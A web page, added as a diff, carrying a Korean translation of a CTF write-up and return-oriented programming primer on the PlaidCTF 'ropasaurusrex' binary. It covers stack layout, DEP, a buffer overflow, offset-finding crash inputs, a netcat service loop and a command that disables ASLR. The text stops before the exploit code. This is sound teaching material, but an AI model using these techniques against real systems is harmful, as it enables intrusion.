@@ -1,0 +1,1934 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>ropasaurusrex: return-oriented programming 입문서 - Yous</title>
+  <meta name="author" content="Yous">
+
+  
+  <meta name="description" content="SkullSecurity가 쓴 return-oriented programming에 관한 입문서가 있어 번역했다. CTF 대회 중 가장 기분이 나쁠 때는 나중에 깨닫는 문제를 풀 때다. 한 문제에 몇 시간을 보내고 나서&mdash;내가 cnot에 쓴 시간에 비할 바는 &hellip;">
+  <meta name="keywords" content="pctf, plaidctf, ropasaurusrex, rop, return-oriented programming">
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://blog.yous.be/2014/03/19/ropasaurusrex-a-primer-on-return-oriented-programming">
+  <link href="/favicon.ico" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Yous" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+<!-- Social media content metadata -->
+
+  <meta property="fb:admins" content="100001802412550">
+  <meta property="og:title" content="ropasaurusrex: return-oriented programming 입문서">
+  <meta property="og:site_name" content="Yous">
+  <meta property="og:url" content="http://blog.yous.be/2014/03/19/ropasaurusrex-a-primer-on-return-oriented-programming">
+  <meta property="og:description" content="SkullSecurity가 쓴 return-oriented programming에 관한 입문서가 있어 번역했다. CTF 대회 중 가장 기분이 나쁠 때는 나중에 깨닫는 문제를 풀 때다. 한 문제에 몇 시간을 보내고 나서&mdash;내가 cnot에 쓴 시간에 비할 바는 아니지만&mdash;사실은 꽤 쉬운 문제라는 걸 깨닫는다. 하지만 역시 골치아프다. 그게 &hellip;">
+  
+  
+
+<meta name="twitter:card" content="summary">
+
+<meta name="twitter:title" content="ropasaurusrex: return-oriented programming 입문서">
+<meta name="twitter:description" content="SkullSecurity가 쓴 return-oriented programming에 관한 입문서가 있어 번역했다. CTF 대회 중 가장 기분이 나쁠 때는 나중에 깨닫는 문제를 풀 때다. 한 문제에 몇 시간을 보내고 나서&mdash;내가 cnot에 쓴 시간에 비할 바는 아니지만&mdash;사실은 꽤 쉬운 문제라는 걸 깨닫는다. 하지만 역시 골치아프다. 그게 &hellip;">
+
+
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-43111808-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   class="collapse-sidebar sidebar-footer" >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Yous</a></h1>
+  
+    <h2>for hackers.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:blog.yous.be" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/about">About</a></li>
+  <li><a href="/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      
+        <h1 class="entry-title"><a href="https://blog.skullsecurity.org/2013/ropasaurusrex-a-primer-on-return-oriented-programming">ropasaurusrex: return-oriented programming 입문서 &rarr;</a></h1>
+      
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-03-19T20:44:03+09:00" pubdate data-updated="true">Mar 19<span>th</span>, 2014</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><a href="https://blog.skullsecurity.org">SkullSecurity</a>가 쓴 <a href="http://en.wikipedia.org/wiki/Return-oriented_programming">return-oriented programming</a>에 관한 <a href="https://blog.skullsecurity.org/2013/ropasaurusrex-a-primer-on-return-oriented-programming">입문서</a>가 있어 번역했다.</p>
+
+<!-- more -->
+
+
+<hr />
+
+<p>CTF 대회 중 가장 기분이 나쁠 때는 <a href="http://knowyourmeme.com/memes/captain-hindsight">나중에 깨닫는</a> 문제를 풀 때다. 한 문제에 몇 시간을 보내고 나서&mdash;내가 <a href="https://blog.skullsecurity.org/blog/2013/epic-cnot-writeup-plaidctf">cnot</a>에 쓴 시간에 비할 바는 아니지만&mdash;사실은 꽤 쉬운 문제라는 걸 깨닫는다. 하지만 역시 골치아프다. 그게 결국에는 ROP에 대한 것이다!</p>
+
+<p>어쨌든, 잘못된 방법으로 많은 시간을 썼음에도 불구하고 (특히, 한동안 <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a>을 우회할 생각은 하지 않았다), 우리가 이 문제를 풀기까지 거쳤던 과정(ASLR을 고려하지 않고, 그 다음은 ASLR을 고려해서)은 설명하기 좋은 방법이므로 이 글에서도 같은 방법을 사용하겠다.</p>
+
+<p>먼저, 이 글에서 파트너가 되어 준 HikingPete에게 감사하고 싶다. 그 덕분에 우리는 이 퍼즐을 훨씬 빨리 풀 수 있었고, 잠깐 동안 세계 3위를 차지했다!</p>
+
+<p>우연히, 난 한동안 <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">ROP</a>에 대한 글을 쓸 셈이었다. 심지어 기초가 될 취약한(vulnerable) 데모 프로그램까지 만들고 있었다! 하지만 PlaidCTF에서 문제가 나왔으니 그 데모 대신 이 문제에 대해 말하겠다! 이건 단순한 writeup이 아니고, 상당히 상세한 return-oriented programming 입문서가 될 것이다! 만약 CTF 문제를 푸는 과정이 더 궁금하다면, <a href="https://blog.skullsecurity.org/blog/2013/epic-cnot-writeup-plaidctf">내 cnot writeup</a>을 보라. :)</p>
+
+<h2>도대체 ROP가 뭐야?</h2>
+
+<p>ROP&mdash;return-oriented programming&mdash;는 고전적 익스플로잇(exploit) &ldquo;<a href="https://en.wikipedia.org/wiki/Return-to-libc_attack">return into libc</a>&#8220;를 나타내는 현대 용어다. 이 아이디어는 프로그램을 마음대로 조종할 수 있는 오버플로(overflow)나 다른 유형의 취약점을 발견했지만, 코드를 실행 가능한 메모리 영역(executable memory)에 올릴 수 있는 확실한 방법이 없을 때(<a href="https://en.wikipedia.org/wiki/Data_Execution_Prevention">DEP</a>, 데이터 실행 방지(Data Execution Prevention), 사용자가 원하는 곳에서부터 코드를 실행시킬 수 없다)를 위한 것이다.</p>
+
+<p>ROP를 이용하면 이미 실행 가능한 메모리 영역(executable memory)에 있는 코드 중 &lsquo;<a href="https://en.wikipedia.org/wiki/Return_statement">return</a>&#8216;으로 끝나는 조각들을 뽑아 고를 수 있다. 그 조각들이 가끔은 간단하고, 가끔은 복잡하다. 다행히도 이 예제에서 우리는 간단한 것들만 필요하다!</p>
+
+<p>하지만 우린 너무 앞서나가고 있다. 일단 <a href="https://en.wikipedia.org/wiki/Call_stack">스택(stack)</a>에 대해 좀 더 배워보자! 스택을 설명하는 데에 <em>엄청난</em> 시간을 쓰지는 않을 것이니, 잘 모르겠다면 <a href="https://blog.skullsecurity.org/wiki/index.php/The_Stack">내 어셈블리(assembly) 튜토리얼</a><sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>을 보라.</p>
+
+<h2>스택</h2>
+
+<p>스택에 관해 한 번쯤은 들어보았을 것이다. <a href="https://en.wikipedia.org/wiki/Stack_overflow">스택 오버플로(stack overflow)</a>? 스택 깨뜨리기(smashing the stack)? 하지만 그게 무슨 뜻인가? 이미 알고 있다면, 이걸 간단한 입문서 정도로 생각하거나 바로 다음 섹션으로 넘어가라. 당신 마음대로!</p>
+
+<p>이 간단한 아이디어를 설명하자면, 함수 <code>A()</code>가 함수 <code>B()</code>를 두 개의 인자 1, 2와 함께 콜 한다고 하자. 그리고 <code>B()</code>는 <code>C()</code>를 두 개의 인자 3, 4와 함께 호출한다고 하자. <code>C()</code>가 실행 중일 때, 스택은 이렇게 보일 것이다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
+</span><span class='line'>|         ...          | (높은 주소)
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+ &lt;-- 'A'의 스택 프레임 시작
+</span><span class='line'>|   [return address]   | &lt;-- 'A'를 호출한 주소
+</span><span class='line'>+----------------------+
+</span><span class='line'>|   [frame pointer]    |
+</span><span class='line'>+----------------------+
+</span><span class='line'>|   [local variables]  |
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+ &lt;-- 'B'의 스택 프레임 시작
+</span><span class='line'>|         2 (parameter)|
+</span><span class='line'>+----------------------+
+</span><span class='line'>|         1 (parameter)|
+</span><span class='line'>+----------------------+
+</span><span class='line'>|   [return address]   | &lt;-- 'B'가 반환되는 주소
+</span><span class='line'>+----------------------+
+</span><span class='line'>|   [frame pointer]    |
+</span><span class='line'>+----------------------+
+</span><span class='line'>|   [local variables]  |
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+ &lt;-- 'C'의 스택 프레임 시작
+</span><span class='line'>|         4 (parameter)|
+</span><span class='line'>+----------------------+
+</span><span class='line'>|         3 (parameter)|
+</span><span class='line'>+----------------------+
+</span><span class='line'>|   [return address]   | &lt;-- 'C'가 반환되는 주소
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+
+</span><span class='line'>|         ...          | (낮은 주소)
+</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>당신이 이 수준에서 숨쉬듯이 생각하는 사람이 아니라면 이건 꽤 어려운 (눈을 끄는?) 것이기 때문에 조금 설명하도록 하겠다. 매번 당신이 함수를 호출할 때, 새로운 &ldquo;스택 프레임&#8221;이 만들어진다. &#8220;프레임&#8221;은 단순히 말해 함수가 자신을 위해 스택에 할당한 메모리다. 사실은 할당조차 하지 않으며, 그저 끝에 뭔가 추가하고 <code>esp</code> 레지스터를 업데이트 한다. 그러면 이것이 호출하는 모든 함수는 자신의 스택 프레임이 어디에서 시작해야 하는지 알게 된다(<code>esp</code>, 스택 포인터이며 이는 기본적으로 변수다).</p>
+
+<p>이 스택 프레임은 현재 함수의 상태(Context)를 담고 있고, 당신이 쉽게 a) 새로 불린 함수의 프레임을 만들고, b) 이전 프레임으로 돌아갈 수 있게 한다 (예를 들어, 함수에서 반환한 경우). <code>esp</code>(스택 포인터)는 위아래로 움직이지만 항상 스택의 시작점(가장 낮은 주소)을 가리킨다.</p>
+
+<p>다른 함수를 호출했을 때 원래 함수의 지역 변수들은 어디로 가는지 궁금한 적이 있는가 (더 좋게는, 같은 함수를 재귀적으로 한 번 더 호출할 때)? 당연히 없을 것이다! 하지만 생각해 봤다면, 이미 알고 있을 것이다: 우리가 다시 돌아올 예전 스택 프레임에 머무른다!</p>
+
+<p>이제 스택에 무엇이 저장되어 있는지 스택에 들어간 순서대로 보자 (헷갈리지만, 스택을 다른 방법으로 그릴 수도 있다; 이 글에서는 스택이 위에서 아래로 늘어나기에 오래된/호출하는 함수는 위에, 새로운/호출된 함수는 아래에 있다):</p>
+
+<ul>
+<li>인자(Parameters): 호출한 함수가 넘긴 인자들&mdash;ROP에서 <em>대단히</em> 중요하다.</li>
+<li>반환 주소(Return address): 모든 함수는 자신이 끝나면 어디로 가야 하는지 알아야 한다. 당신이 함수를 호출하면, 그 함수에 진입하기 앞서 호출 직후의 명령어(instruction) 주소가 스택에 들어간다. 반환하는 순간, 그 주소를 스택에서 뽑고, 그리로 점프한다. 이건 ROP에서 대단히 중요하다.</li>
+<li>프레임 포인터(Saved frame pointer): 이건 완전히 무시하자. 정말로. 이건 예외는 있지만 컴파일러가 일반적으로 하는 일이고, 이에 대해 다시 언급하지는 않을 것이다.</li>
+<li>지역 변수(Local variables): 함수는 지역 변수를 저장하기 위해 필요한 만큼 (적당한 범위 내에서) 메모리를 할당할 수 있다. 지역 변수는 여기서 시작한다. ROP와는 전혀 관계 없으며 무시해도 안전하다.</li>
+</ul>
+
+
+<p>그래서, 요약하자면: 함수가 호출되면 인자들이 스택에 들어가고, 그 뒤에 반환 주소가 들어간다. 함수가 반환하면, 반환 주소를 스택에서 뽑아 그리로 점프한다. 스택에 들어갔던 인자들은 <a href="https://en.wikipedia.org/wiki/X86_calling_conventions#cdecl">호출하는 함수에 의해 지워지지만</a>, <a href="https://en.wikipedia.org/wiki/X86_calling_conventions#stdcall">예외</a>도 있다. 우리는 호출하는 함수가 인자를 지운다고 가정하자. 즉, 호출된 함수가 자신의 인자를 지우지 않는다고 가정하자. 이건 이 문제가 (그리고 Linux 대부분의 역사에서) 그렇게 동작하기 때문이다.</p>
+
+<h2>천국, 지옥 그리고 스택 프레임</h2>
+
+<p>ROP를 이해하기 위해 이해해야 하는 가장 중요한 건: 함수의 스택 프레임은 그 함수의 온 우주라는 것이다. 스택은 함수의 신이고, 인자는 성경의 십계명이고, 지역 변수는 죄며, 프레임 포인터는 성경이고 반환 주소는 천국이다 (그래, 지옥일 수도 있다). 모든 건 <a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html">인텔의 책</a>, 챕터 3, 19-26 구절에 있다 (주: 사실 아니니 보는 수고는 하지 마라).</p>
+
+<p>당신이 <code>sleep()</code> 함수를 호출하고, 첫 라인에 왔다고 하자; 그 스택 프레임은 이렇게 생겼을 것이다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>          ...            &lt;-- 모른다, 영역은 상관 없다. (높은 주소)
+</span><span class='line'>+----------------------+
+</span><span class='line'>|      [seconds]       |
+</span><span class='line'>+----------------------+
+</span><span class='line'>|   [return address]   | &lt;-- esp는 여기를 가리킨다.
+</span><span class='line'>+----------------------+
+</span><span class='line'>          ...            &lt;-- 할당되지 않았다, 영역은 상관 없다. (낮은 주소)</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>sleep()</code>이 시작하는 순간, 스택 프레임은 지금 보이는 게 다다. 이 스택 프레임은 프레임 포인터를 저장할 수도 있고 (젠장, 말 안 하기로 해 놓고 두 번이나 말해버렸다; 다시는 언급하지 않을 것을 맹세한다) <code>esp</code>에서 몇 바이트 뺌으로써 (즉, <code>esp</code> 포인터를 더 낮은 주소로 만듦으로써) 지역 변수를 위한 공간을 확보할 수도 있다. <code>esp</code> 아래에 새 프레임을 만드는 다른 함수를 호출할 수도 있다. 이 스택 프레임은 여러 가지 다양한 일을 할 수 있다; 그게 무엇인지 간에, <code>sleep()</code>이 시작하면, 스택 프레임은 이 함수의 세계를 만들어낸다.</p>
+
+<p><code>sleep()</code>이 반환하면, 결국 이렇게 생겼을 것이다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>          ...            &lt;-- 모른다, 영역은 상관 없다. (높은 주소)
+</span><span class='line'>+----------------------+
+</span><span class='line'>|      [seconds]       | &lt;-- esp는 여기를 가리킨다.
+</span><span class='line'>+----------------------+
+</span><span class='line'>| [old return address] | &lt;-- 할당되지 않았다, 영역은 상관 없다. 이제 여기부터 시작한다.
+</span><span class='line'>+----------------------+
+</span><span class='line'>          ...            (낮은 주소)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>당연히 호출한 함수는 <code>sleep()</code>이 반환하고 나면 <code>esp</code>에 4를 더해 &ldquo;seconds&#8221;를 스택에서 지운다 (나중에 똑같은 일을 하기 위해 어떻게 <code>pop/pop/ret</code>을 사용해야 하는지 이야기할 것이다).</p>
+
+<p>제대로 동작하는 시스템에서는, 이게 작동 원리다. 안전한 전제다. &ldquo;seconds&rdquo; 값은 스택에 들어갔을 때 스택에만 있을 것이고, 반환 주소는 호출된 장소를 가리키고 있을 것이다. 그럼, 그럼. 달리 어떤 방법으로 그리 갈 수 있을까?</p>
+
+<h2>스택 주무르기</h2>
+
+<p>&hellip;뭐, 당신이 궁금해 하니 말하겠다. 우리 모두 &ldquo;스택 오버플로&#8221;에 대해 들어봤다. 그건 스택에 있는 변수를 덮어쓰는 것과 관련이 있다. 그게 무슨 뜻이냐? 뭐, 이런 스택 프레임이 있다고 하자:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>          ...            &lt;-- 모른다, 영역은 상관 없다. (높은 주소)
+</span><span class='line'>+----------------------+
+</span><span class='line'>|      [seconds]       |
+</span><span class='line'>+----------------------+
+</span><span class='line'>|   [return address]   | &lt;-- esp는 여기를 가리킨다.
+</span><span class='line'>+----------------------+
+</span><span class='line'>|     char buf[16]     |
+</span><span class='line'>|                      |
+</span><span class='line'>|                      |
+</span><span class='line'>|                      |
+</span><span class='line'>+----------------------+
+</span><span class='line'>          ...            (낮은 주소)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>변수 <code>buf</code>의 길이는 16바이트다. 만약 프로그램이 buf의 17번째 바이트(즉, <code>buf[16]</code>)에 쓰려고 하면 어떻게 될까? 에, 반환 주소의 마지막 바이트&mdash;<a href="https://en.wikipedia.org/wiki/Endianness">리틀 엔디안</a>&mdash;에 쓰게 된다. 18번째 바이트는 반환 주소의 끝에서 두 번째 바이트에 쓰게 되고, 그런 방식이다. 이렇게 우리는 우리가 원하는 곳으로 반환 주소를 바꿀 수 있다. <em>원하는 곳 어디든</em>. 함수가 반환하면, 어디로 가겠는가? 뭐, 아마 그건 가야 할 곳으로 가고 있다고 생각할 것이다&mdash;완벽한 세계에서는, 그럴 것이다&mdash;하지만 아니다! 이 경우에는, 공격자가 원하는 곳 어디로든지 갈 수 있다. 공격자가 <a href="https://en.wikipedia.org/wiki/Zero_page">0</a>으로 점프하라고 하면, 0으로 점프하고 크래시를 일으킬 것이다. 공격자가 <code>0x41414141</code>(&ldquo;AAAA&rdquo;)로 점프하라고 하면, 그리로 점프하고 아마도 크래시를 일으킬 것이다. 공격자가 스택으로 점프하라고 하면&hellip; 음, 이건 좀 복잡해진다&hellip;</p>
+
+<h2>DEP</h2>
+
+<p>전통적으로, 공격자는 스택에 코드를 넣을 수 있었기 때문에 (어찌 되었건, 코드는 그저 바이트 뭉치일 뿐이다!), 반환 주소가 스택을 가리키도록 바꿔 왔다. 하지만 그건 시스템을 공격하는 일반적이고 쉬운 방법이었기 때문에, OS 회사의 나쁜 자식들이 (농담이다, 난 당신들을 사랑한다 :)) 데이터 실행 방지, DEP를 통해 이를 멈췄다. DEP가 적용된 어떤 시스템이건, 스택에서 코드를 실행할 수 없다&mdash;좀 더 일반적으로, 공격자가 쓸(write) 수 있는 어떤 곳에서도&mdash;그렇지 않으면, 크래시를 일으킨다.</p>
+
+<p>그러면 코드를 실행할 권한도 없이 도대체 어떻게 코드를 실행할 수 있나!?</p>
+
+<p>음, 이제 그걸 할 것이다. 하지만 먼저, 이 문제가 사용하는 취약점을 보자!</p>
+
+<h2>취약점</h2>
+
+<p>여기 IDA에서 갓 나온 취약한 함수다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>.text:080483F4vulnerable_function proc near
+</span><span class='line'>.text:080483F4
+</span><span class='line'>.text:080483F4buf             = byte ptr -88h
+</span><span class='line'>.text:080483F4
+</span><span class='line'>.text:080483F4         push    ebp
+</span><span class='line'>.text:080483F5         mov     ebp, esp
+</span><span class='line'>.text:080483F7         sub     esp, 98h
+</span><span class='line'>.text:080483FD         mov     dword ptr [esp+8], 100h ; nbytes
+</span><span class='line'>.text:08048405         lea     eax, [ebp+buf]
+</span><span class='line'>.text:0804840B         mov     [esp+4], eax    ; buf
+</span><span class='line'>.text:0804840F         mov     dword ptr [esp], 0 ; fd
+</span><span class='line'>.text:08048416         call    _read
+</span><span class='line'>.text:0804841B         leave
+</span><span class='line'>.text:0804841C         retn
+</span><span class='line'>.text:0804841Cvulnerable_function endp</span></code></pre></td></tr></table></div></figure>
+
+
+<p>어셈블리를 모른다면, 좀 벅차보일 것이다. 하지만 사실 간단하다. 같은 함수의 C 코드다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">ssize_t</span> <span class="kr">__cdecl</span> <span class="nf">vulnerable_function</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">136</span><span class="p">];</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>256 바이트를 읽어 136 바이트 버퍼에 넣는다. 즐거웠어요 스택 씨!</p>
+
+<p>이걸 실행함으로써 쉽게 확인할 수 있다. &lsquo;A&rsquo; 뭉치를 파이프로 넣고, 어떻게 되는지 보자:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span><span class="nb">ulimit</span> -c unlimited
+</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s2">&quot;print &#39;A&#39;x300&quot;</span> | ./ropasaurusrex
+</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
+</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>gdb ./ropasaurusrex core
+</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
+</span><span class='line'>Program terminated with signal 11, Segmentation fault.
+</span><span class='line'><span class="c">#0  0x41414141 in ?? ()</span>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>간단히 말해서, 이건 우리가 반환 주소를 글자 A 4개(<code>0x41414141</code>=&ldquo;AAAA&rdquo;)로 덮어썼다는 걸 의미한다.</p>
+
+<p>이제, 정확히 뭘 조종하고 있는 건지 알아내기 위한 좋은 방법이 있고 나쁜 방법이 있다. 나는 나쁜 방법을 썼다. 내 버퍼 끝에 &ldquo;BBBB&#8221;를 넣고 <code>0x42424242</code>(&#8220;BBBB&rdquo;)에서 크래시를 일으킬 때까지 &lsquo;A&#8217;를 지웠다.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s2">&quot;print &#39;A&#39;x140;print &#39;BBBB&#39;&quot;</span> | ./ropasaurusrex
+</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
+</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>gdb ./ropasaurusrex core
+</span><span class='line'><span class="c">#0  0x42424242 in ?? ()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>이걸 좀 더 &ldquo;잘&rdquo; (내 뜻은, 더 천천히) 하고 싶으면, Metasploit의 <a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/pattern_create.rb">pattern_create.rb</a>와 <a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/pattern_offset.rb">pattern_offset.rb</a>를 보라. 이건 추측이 느린 작업일 때 굉장히 좋지만, 이 문제의 경우에는 추측과 확인이 빨라 나는 쓰지 않았다.</p>
+
+<h2>익스플로잇 제작 시작하기</h2>
+
+<p>가장 먼저 해야 할 일은 <code>ropasaurusrex</code>를 네트워크 서비스로 실행시키는 것이다. CTF 주최자들은 <a href="https://en.wikipedia.org/wiki/Xinetd">xinetd</a>를 썼지만, 우리는 (우리의 목적에) 그만큼 좋은 <a href="https://en.wikipedia.org/wiki/Netcat">netcat</a>을 쓸 것이다.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span><span class="k">while </span><span class="nb">true</span>; <span class="k">do </span>nc -vv -l -p 4444 -e ./ropasaurusrex; <span class="k">done</span>
+</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> 4444 ...
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>이제부터 우리는 <code>localhost:4444</code>를 익스플로잇 대상으로 쓸 수도 있고 실제 서버에도 작용하는지 테스트 할 수도 있다.</p>
+
+<p>ASLR을 끄고 싶다면:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>sudo sysctl -w kernel.randomize_va_space<span class="o">=</span>0
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>이건 당신의 시스템이 익스플로잇 당하기 쉽게 만든다는 것을 알아둬라. 그러니 이걸 실험실 환경 바깥에서 하는 건 추천하지 않는다!</p>
+
+<p>초반 익스플로잇을 위한 루비 코드다:</p>
+
